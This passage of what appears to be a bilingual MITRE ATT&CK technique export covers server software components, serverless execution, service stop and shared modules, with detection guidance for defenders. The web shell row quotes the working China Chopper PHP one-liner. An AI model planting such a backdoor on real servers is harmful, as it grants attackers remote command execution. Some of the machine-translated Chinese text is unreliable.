Muzabi),(Citation: Proofpoint TA407 September 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: DOJ Iran Indictments March 2018),(Citation: Google EXOTIC LILY March 2022),",搜索受害者拥有的网站,攻击者可能会在受害者拥有的网站上搜索可在定位期间使用的信息。受害者拥有的网站可能包含各种详细信息，包括部门/部门的名称、实际位置以及有关关键员工的数据，例如姓名、角色和联系信息（例如：[电子邮件地址](https://attack.mitre .org/techniques/T1589/002))。这些网站还可能包含突出业务运营和关系的详细信息。（引文：Comparitech Leak）攻击者可能会搜索受害者拥有的网站以收集可操作的信息。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放技术数据库](https://attack.mitre .org/techniques/T1596)），建立运营资源（例如：[建立账户](https://attack.mitre.org/techniques/T1585) 或[妥协账户](https://attack.mitre.org/技术/T1586)）和/或初始访问权限（例如：[受信任的关系](https://attack.mitre.org/techniques/T1199) 或 [网络钓鱼](https://attack.mitre.org/techniques/ T1566))。
T1505,Server Software Component,Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW),https://attack.mitre.org/techniques/T1505,28 June 2019,19 October 2022,1.4,Persistence,"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.

Process monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ","Linux, Network, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",False,,,,,,,,,,",(Citation: ITSyndicate Disabling PHP functions),(Citation: Microsoft System Services Fundamentals),(Citation: NSA and ASD Detect and Prevent Web Shells 2020)",服务器软件组件,攻击者可能会滥用服务器的合法可扩展开发特性来建立对系统的持久访问。企业服务器应用程序可能包括允许开发人员编写和安装软件或脚本以扩展主应用程序功能的功能。攻击者可能会安装恶意组件来扩展和滥用服务器应用程序。（引用：volexity_0day_sophos_FW）
T1505.004,Server Software Component: IIS Components,"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)

Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)

Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)",https://attack.mitre.org/techniques/T1505/004,03 June 2021,17 October 2021,1.0,Persistence,"Monitor for creation and/or modification of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules. Changes to <code>%windir%\system32\inetsrv\config\applicationhost.config</code> could indicate an IIS module installation.(Citation: Microsoft IIS Modules Overview 2007)(Citation: ESET IIS Malware 2021)

Monitor execution and command-line arguments of <code>AppCmd.exe</code>, which may be abused to install malicious IIS modules.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Unit 42 RGDoor Jan 2018)(Citation: ESET IIS Malware 2021)",Windows,"Command: Command Execution, File: File Creation, File: File Modification",True,T1505,,Wes Hurd,"Administrator, SYSTEM",,,,,,"(Citation: ESET IIS Malware 2021),(Citation: Dell TG-3390),(Citation: CrowdStrike IceApple May 2022),(Citation: Unit 42 RGDoor Jan 2018),(Citation: Microsoft ISAPICGIRestriction 2016)",服务器软件组件：IIS 组件,攻击者可能会安装在 Internet 信息服务 (IIS) Web 服务器上运行的恶意组件以建立持久性。 IIS 提供了多种机制来扩展 Web 服务器的功能。例如，可以安装 Internet 服务器应用程序编程接口 (ISAPI) 扩展和过滤器来检查和/或修改传入和传出的 IIS Web 请求。扩展和过滤器部署为导出三个函数的 DLL 文件：<code>Get{Extension/Filter}Version</code>、<code>Http{Extension/Filter}Proc</code> 和（可选）<code>终止{Extension/Filter}</code>。也可以安装 IIS 模块来扩展 IIS Web 服务器。（引用：Microsoft ISAPI Extension Overview 2017）（引用：Microsoft ISAPI Filter Overview 2017）（引用：IIS Backdoor 2011）（引用：Trustwave IIS Module 2013）攻击者可能安装恶意 ISAPI扩展和过滤器来观察和/或修改流量，在受感染的机器上执行命令，或代理命令和控制流量。 ISAPI 扩展和过滤器可以访问所有 IIS Web 请求和响应。例如，攻击者可能滥用这些机制来修改 HTTP 响应，以便将恶意命令/内容分发到以前包含的主机。（引用：Microsoft ISAPI 过滤器概述 2017）（引用：Microsoft ISAPI 扩展概述 2017）（引用：Microsoft ISAPI 扩展All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012) 攻击者也可能安装恶意 IIS 模块来观察和/或修改流量。 IIS 7.0 引入了提供与 ISAPI 扩展和过滤器相同的对 HTTP 请求和响应的无限制访问的模块。 IIS 模块可以编写为导出 <code>RegisterModule</code> 的 DLL，或者编写为与 ASP.NET API 接口以访问 IIS HTTP 请求的 .NET 应用程序。（引用：Microsoft IIS Modules Overview 2007）（引用： Trustwave IIS 模块 2013)（引用：ESET IIS 恶意软件 2021）
T1505.001,Server Software Component: SQL Stored Procedures,"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).

Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) 

Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) ",https://attack.mitre.org/techniques/T1505/001,12 December 2019,25 March 2020,1.0,Persistence,"On a MSSQL Server, consider monitoring for xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) Consider enabling audit features that can log malicious startup activities.","Linux, Windows",Application Log: Application Log Content,True,T1505,,"Carlos Borges, @huntingneo, CIP; Kaspersky; Lucas da Silva Pereira, @vulcanunsec, CIP","Administrator, root, SYSTEM",,,,,,"(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Dragos Crashoverride 2018),",服务器软件组件：SQL 存储过程,攻击者可能会滥用 SQL 存储过程来建立对系统的持久访问。 SQL 存储过程是可以保存和重用的代码，这样数据库用户就不会浪费时间重写经常使用的 SQL 查询。存储过程可以使用过程名称或通过定义的事件（例如，当 SQL 服务器应用程序启动/重新启动时）通过 SQL 语句调用到数据库。攻击者可能制作恶意存储过程，可以在 SQL 数据库服务器中提供持久性机制。（引用：NetSPI 启动存储过程）（引用：卡巴斯基 MSSQL 2019 年 8 月）要通过 SQL 语法执行操作系统命令，攻击者可能必须启用其他功能，例如用于 MSSQL Server 的 xp_cmdshell。（引用：NetSPI 启动存储过程）（引用：Kaspersky MSSQL Aug 2019）（引用：Microsoft xp_cmdshell 2017）Microsoft SQL Server 可以启用公共语言运行时 (CLR) 集成。启用 CLR 集成后，应用程序开发人员可以使用任何 .NET 框架语言（例如 VB .NET、C# 等）编写存储过程。（引用：Microsoft CLR 集成 2017）攻击者可以制作或修改链接到存储过程的 CLR 程序集因为这些 CLR 程序集可以用来执行任意命令。（引用：NetSPI SQL Server CLR）
T1505.005,Server Software Component: Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)

[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a ""generic"" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.

Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",https://attack.mitre.org/techniques/T1505/005,28 March 2022,18 April 2022,1.0,Persistence,"Monitor for changes to Registry keys associated with <code>ServiceDll</code> and other subkey values under <code>HKLM\System\CurrentControlSet\services\TermService\Parameters\</code>.

Monitor unexpected changes and/or interactions with <code>termsrv.dll</code>, which is typically stored in <code>%SystemRoot%\System32\</code>.

Monitor commands as well as  processes and arguments for potential adversary actions to modify Registry values (ex: <code>reg.exe</code>) or modify/replace the legitimate <code>termsrv.dll</code>.

Monitor module loads by the Terminal Services process (ex: <code>svchost.exe -k termsvcs</code>) for unexpected DLLs (the default is <code>%SystemRoot%\System32\termsrv.dll</code>, though an adversary could also use [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005) on a malicious payload).",Windows,"Command: Command Execution, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1505,,,,,,,,,",(Citation: Microsoft System Services Fundamentals)",服务器软件组件：终端服务 DLL,攻击者可能会滥用终端服务的组件来实现对系统的持久访问。自 2022 年起，Microsoft 终端服务在某些 Windows Server 操作系统中重命名为远程桌面服务，可实现与主机的远程终端连接。终端服务允许服务器通过 RDP 向客户端传输完整的交互式图形用户界面。（引用：Microsoft 远程桌面服务）[Windows 服务]（https://attack.mitre.org/techniques/T1543/003）作为“通用”进程运行（例如：<code>svchost.exe</code>）加载服务的 DLL 文件，该文件的位置存储在名为 <code>ServiceDll</code> 的注册表项中。（引文: Microsoft System Services Fundamentals) <code>termsrv.dll</code> 文件，通常存储在 `%SystemRoot%\System32\` 中，是 `HKLM\ 中终端服务的默认 <code>ServiceDll</code> 值System\CurrentControlSet\services\TermService\Parameters\`。攻击者可以修改和/或替换终端服务 DLL 以启用对受害主机的持久访问。（引用：James TermServ DLL）可以对此 DLL 进行修改以执行任意有效负载（同时还可能保留正常的 <code>termsrv.dll< /code> 功能）以及简单地启用终端服务的可滥用功能。例如，攻击者可以通过修补 <code>termsrv.dll</code> 文件或修改 <code>ServiceDll</code> 值以指向提供增强的 RDP 功能的 DLL。（引用：Windows OS Hub RDP）（引用：RDPWrap Github）在非服务器 Windows 操作系统上，此增加的功能还可以启用攻击者避免在创建新 RDP 会话时警告/注销系统用户的终端服务提示。
T1505.002,Server Software Component: Transport Agent,"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. 

Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ",https://attack.mitre.org/techniques/T1505/002,12 December 2019,18 October 2021,1.0,Persistence,Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.,"Linux, Windows","Application Log: Application Log Content, File: File Creation",True,T1505,,Christoffer Strömblad; ESET,"Administrator, root, SYSTEM",,,,,,"(Citation: ESET LightNeuron May 2019),",服务器软件组件：传输代理,攻击者可能会滥用 Microsoft 传输代理来建立对系统的持久访问。 Microsoft Exchange 传输代理可以对通过传输管道的电子邮件进行操作，以执行各种任务，例如过滤垃圾邮件、过滤恶意附件、日记或在所有外发电子邮件的末尾添加公司签名。（引用：Microsoft TransportAgent Jun 2016） （引用：ESET LightNeuron 2019 年 5 月）传输代理可以由应用程序开发人员编写，然后编译为 .NET 程序集，随后在 Exchange 服务器中注册。传输代理将在电子邮件处理的指定阶段被调用并执行开发人员定义的任务。攻击者可能会注册恶意传输代理，以便在 Exchange Server 中提供可由攻击者指定的电子邮件事件触发的持久性机制。（引用：ESET LightNeuron 2019 年 5 月）尽管可能会为通过 Exchange 传输的所有电子邮件调用恶意传输代理在管道中，代理可以配置为仅执行特定任务以响应对手定义的标准。例如，如果收件人电子邮件地址与对手提供的列表中的条目匹配，则传输代理可能仅执行复制传输中的附件并将其保存以供以后泄露之类的操作。
T1505.003,Server Software Component: Web Shell,"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",https://attack.mitre.org/techniques/T1505/003,13 December 2019,19 October 2022,1.3,Persistence,"Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) 

<code>&lt;?php @eval($_POST['password']);&gt;</code>

Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.(Citation: NSA Cyber Mitigating Web Shells)

File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script.(Citation: NSA Cyber Mitigating Web Shells)

Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)","Linux, Network, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1505,,"Arnim Rupp, Deutsche Lufthansa AG",,,Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.,CAPEC-650,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Microsoft GALLIUM December 2019),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Tarrask scheduled task),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: FireEye APT39 Jan 2019),(Citation: Volexity OceanLotus Nov 2017),(Citation: FireEye APT40 March 2019),(Citation: Unit 42 Playbook Dec 2017),(Citation: CrowdStrike Deep Panda Web Shells),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: FireEye Exchange Zero Days March 2021),(Citation: CISA AA20-301A Kimsuky),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Dell TG-3390),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Lee 2013),(Citation: Volexity Exchange Marauder March 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: CISA Supernova Jan 2021),(Citation: ESET Exchange Mar 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: FireEye TRITON 2019),(Citation: US-CERT TA18-074A),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ANSSI Sandworm January 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: ITSyndicate Disabling PHP functions),(Citation: NSA and ASD Detect and Prevent Web Shells 2020)",服务器软件组件：Web Shell,攻击者可能会使用带有 Web shell 的后门 Web 服务器来建立对系统的持久访问。 Web shell 是放置在可公开访问的 Web 服务器上的 Web 脚本，以允许攻击者使用 Web 服务器作为进入网络的网关。 Web shell 可以在托管 Web 服务器的系统上提供一组要执行的函数或命令行界面。（引用：volexity_0day_sophos_FW）除了服务器端脚本之外，Web shell 可能有一个客户端界面程序，该程序用于用于与 Web 服务器通信（例如 [China Chopper](https://attack.mitre.org/software/S0020) Web shell 客户端）。（引用：Lee 2013）
T1648,Serverless Execution,"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. 

Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)

Serverless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)",https://attack.mitre.org/techniques/T1648,27 May 2022,24 October 2022,1.0,Execution,,"IaaS, Office 365, SaaS","Application Log: Application Log Content, Cloud Service: Cloud Service Modification",False,,,"Alex Soler, AttackIQ; Cisco; Oleg Kolesnikov, Securonix; Praetorian; Shailesh Tiwary (Indian Army); Varonis Threat Labs",,0.0,,,,,",",无服务器执行,攻击者可能滥用无服务器计算、集成和自动化服务在云环境中执行任意代码。许多云提供商提供各种无服务器资源，包括计算引擎、应用程序集成服务和 Web 服务器。攻击者可能会以各种方式滥用这些资源作为执行任意命令的手段。例如，攻击者可能使用无服务器功能来执行恶意代码，例如加密挖掘恶意软件（即 [Resource Hijacking](https://attack.mitre.org/techniques/T1496)）。（引用：Cado Security Denonia）还可以创建能够进一步破坏云环境的功能。例如，攻击者可以使用 AWS 中的 `IAM:PassRole` 权限或 Google Cloud 中的 `iam.serviceAccounts.actAs` 权限来添加 [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098 /003）到无服务器云功能，然后它可能能够执行原始用户无法执行的操作。（引用：Rhino Security Labs AWS Privilege Escalation）（引用：Rhingo Security Labs GCP Privilege Escalation）也可以调用无服务器函数作为响应到云事件（即[事件触发执行]（https://attack.mitre.org/techniques/T1546）），可能会随着时间的推移持续执行。例如，在 AWS 环境中，攻击者可能会创建一个 Lambda 函数，该函数会自动将 [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) 添加到用户和调用相应的 CloudWatch 事件规则每当创建新用户时，该功能就会起作用。（引用：对 AWS 帐户进行后门）同样，攻击者可能会在 Office 365 环境中创建 Power Automate 工作流，该工作流转发用户收到的所有电子邮件，或在用户被授予访问权限时创建匿名共享链接SharePoint 中的文档。（引用：Varonis Power Automate Data Exfiltration）（引用：Microsoft DART 案例报告 001）
T1489,Service Stop,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) 

Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)",https://attack.mitre.org/techniques/T1489,29 March 2019,28 July 2022,1.2,Impact,"Monitor processes and command-line arguments to see if critical processes are terminated or stop running.

Monitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.

Alterations to the service binary path or the service startup type changed to disabled may be suspicious.

Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Termination, Service: Service Metadata, Windows Registry: Windows Registry Key Modification",False,,,,,,,,Availability,,"(Citation: Trend Micro Ransomware February 2021),(Citation: CrowdStrike Ryuk January 2019),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Unit42 Clop April 2021),(Citation: McAfee Cuba April 2021),(Citation: Secureworks REvil September 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: Sophos Ragnar May 2020),(Citation: Trend Micro KillDisk 2),(Citation: CarbonBlack Conti July 2020),(Citation: FireEye Ransomware Feb 2020),(Citation: FireEye WannaCry 2017),(Citation: Arxiv Avaddon Feb 2021),(Citation: SecureWorks WannaCry Analysis),(Citation: Mcafee Clop Aug 2019),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: McAfee Babuk February 2021),(Citation: Talos Olympic Destroyer 2018),(Citation: IBM MegaCortex),(Citation: Dragos EKANS),(Citation: TrendMicro Netwalker May 2020),(Citation: Sophos Maze VM September 2020),(Citation: CERT-FR PYSA April 2020),(Citation: Intel 471 REvil March 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Fortinet Diavol July 2021),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Check Point Meteor Aug 2021),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Palo Alto Unit 42 EKANS),(Citation: Carbon Black HotCroissant April 2020),(Citation: Dragos Crashoverride 2017),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Check Point Pay2Key November 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),",服务停止,攻击者可能会停止或禁用系统上的服务，以使合法用户无法使用这些服务。停止关键服务或流程可能会抑制或停止对事件的响应，或帮助对手实现对环境造成破坏的总体目标。（引文：Talos Olympic Destroyer 2018）（引文：Novetta Blockbuster）攻击者可以通过禁用个别服务来实现此目的对组织非常重要，例如 <code>MSExchangeIS</code>，这将使 Exchange 内容无法访问（引文： Novetta Blockbuster）。在某些情况下，攻击者可能会停止或禁用许多或所有服务以使系统无法使用。（引用：Talos Olympic Destroyer 2018）服务或进程可能不允许在运行时修改其数据存储。攻击者可能会停止服务或流程以进行 [数据销毁](https://attack.mitre.org/techniques/T1485) 或 [为影响而加密的数据](https://attack.mitre.org/techniques/T1486 ) 在 Exchange 和 SQL Server 等服务的数据存储上。（引用：SecureWorks WannaCry 分析）
T1129,Shared Modules,"Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API.(Citation: Wikipedia Windows Library Files)

The module loader can load DLLs:

* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
    
* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
    
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
    
* via <code>&#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e;</code> in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features.",https://attack.mitre.org/techniques/T1129,31 May 2017,19 April 2022,2.1,Execution,"Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. 

Correlation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.",Windows,"Module: Module Load, Process: OS API Execution",False,,,Stefan Kanthak,,0.0,,,,,"(Citation: FireEye FIN7 Oct 2019),(Citation: Trend Micro KillDisk 1),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ESET Attor Oct 2019),(Citation: ESET PipeMon May 2020),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Kaspersky TajMahal April 2019),(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Gh0stRAT ATT March 2019),(Citation: Prevailion DarkWatchman 2021),(Citation: MSTIC FoggyWeb September 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Cybereason Astaroth Feb 2019),(Citation: CyberBit Dtrack),",共享模块,"攻击者可能通过加载共享模块来执行恶意负载。可以指示 Windows 模块加载器从任意本地路径和任意通用命名约定 (UNC) 网络路径加载 DLL。此功能位于 NTDLL.dll 中，是 Windows [Native API](https://attack.mitre.org/techniques/T1106) 的一部分，可从 <code>CreateProcess</code>、<code> 等函数调用Win32 API 的 LoadLibrary</code> 等。（引用：Wikipedia Windows Library Files）模块加载器可以加载 DLL： * 通过指定 IMPORT 目录中的（完全限定或相对）DLL 路径名； * 通过 EXPORT 转发到另一个 DLL，用（完全限定或相对）路径名（但没有扩展名）指定； * 通过 NTFS 联结或符号链接 program.exe.local 与包含在 IMPORT 目录或转发的 EXPORT 中指定的 DLL 的目录的完全限定或相对路径名； * 通过嵌入或外部“应用程序清单”中的 <code>&#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e;</code>。文件名指的是 IMPORT 目录中的条目或转发的 EXPORT。攻击者可能会使用此功能作为在受害系统上执行任意有效负载的一种方式。例如，恶意软件可能会执行共享模块来加载其他组件或功能。"
T1072,Software Deployment Tools,"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).

